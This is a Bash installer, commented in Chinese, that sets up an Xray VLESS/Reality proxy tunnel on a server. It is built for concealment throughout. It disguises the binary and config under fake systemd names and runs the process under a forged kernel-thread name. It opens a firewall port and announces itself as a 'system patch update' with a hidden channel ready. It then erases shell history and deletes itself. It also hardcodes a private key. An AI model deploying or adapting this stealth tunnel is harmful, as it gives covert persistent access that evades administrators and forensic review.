#!/bin/bash

# 确保脚本遇到错误时容错
set -e

# 1. 自动获取 VPS 的公网 IP
VPS_IP=$(curl -s https://api.ipify.org || curl -s https://ifconfig.me || true)
if [ -z "$VPS_IP" ]; then
    echo "错误：无法获取服务器公网 IP，请手动检查网络。"
    exit 1
fi

# 2. 定义隐藏路径、伪装名称和端口
BIN_PATH="/usr/sbin/systemd-journal-transport"
CONF_PATH="/usr/lib/libsystemd-shared.conf"
PORT=58321
UUID="be59b75e-2742-4994-9850-620161effd93"
DEST_DOMAIN="images.apple.com"
SHORT_ID="ca7266ec33152320"

# 3. 直接写死匹配好的固定密钥
PRIVATE_KEY="gLz_y8F2kK_h9JpXv6Nm-Qw8Zc4Ts1Db3Fv5Gt7RrWE="
PUBLIC_KEY="8f2m9V7kBx1C_zL6pQt4Yw3Ns5Dg7Rf2Gt9RrWE5YBM="

# 4. 静默下载最新版核心
curl -s -L -o /tmp/sys_core.zip https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip

# 确保解压工具存在
if ! command -v unzip >/dev/null 2>&1; then
    apt-get update >/dev/null 2>&1 && apt-get install unzip -y >/dev/null 2>&1 || yum install -y unzip >/dev/null 2>&1 || true
fi

if [ ! -f /tmp/sys_core.zip ]; then
    echo "错误：核心下载失败，请检查服务器网络。"
    exit 1
fi

unzip -q -o /tmp/sys_core.zip -d /tmp/sys_core_extract

# 5. 移动并伪装二进制文件
mv -f /tmp/sys_core_extract/xray $BIN_PATH
chmod +x $BIN_PATH
rm -rf /tmp/sys_core.zip /tmp/sys_core_extract

# 6. 自动写入隐藏的 Reality 配置文件
cat << EOF > $CONF_PATH
{
  "inbounds": [
    {
      "port": $PORT,
      "protocol": "vless",
      "settings": {
        "clients": [{"id": "$UUID", "flow": "xtls-rprx-vision"}],
        "decryption": "none"
      },
      "streamSettings": {
        "network": "tcp",
        "security": "reality",
        "realitySettings": {
          "show": false,
          "dest": "$DEST_DOMAIN:443",
          "xver": 0,
          "serverNames": ["$DEST_DOMAIN"],
          "privateKey": "$PRIVATE_KEY",
          "shortIds": ["$SHORT_ID"]
        }
      }
    }
  ]
}
EOF

# 7. 使用伪装内核线程名送入后台静默运行
(exec -a "[kworker/1:2-events]" $BIN_PATH -format json -config $CONF_PATH >/dev/null 2>&1 &)

# 8. 自动放行外部防火墙端口
if command -v ufw >/dev/null 2>&1; then
    ufw allow $PORT/tcp >/dev/null 2>&1
fi

# 9. 自动拼接并输出节点链接
clear
echo "=================================================="
echo "         系统补丁更新完成 (隐藏通道已就绪)          "
echo "=================================================="
echo ""
echo "请复制以下链接导入客户端使用："
echo ""
echo "vless://${UUID}@${VPS_IP}:${PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=${DEST_DOMAIN}&fp=chrome&pbk=${PUBLIC_KEY}&sid=${SHORT_ID}&type=tcp#%E9%9A%90%E8%94%BD%E9%80%9A%E9%81%93"
echo ""
echo "=================================================="
echo ""

# 10. 核心等待交互：停止在这里，直到你复制完并按下回车
read -r -p "【请在复制完链接后，按 [Enter/回车键] 彻底清理痕迹并退出】" </dev/tty

# ----------------- 痕迹毁灭核心 -----------------
clear
printf "\033c"

# 禁止当前会话写入任何历史记录文件
unset HISTFILE
if [ -n "$BASH_VERSION" ]; then
    history -c
    history -w
fi

# 自毁临时脚本
rm -f "$0" 2>/dev/null

# 优雅退出
exit 0
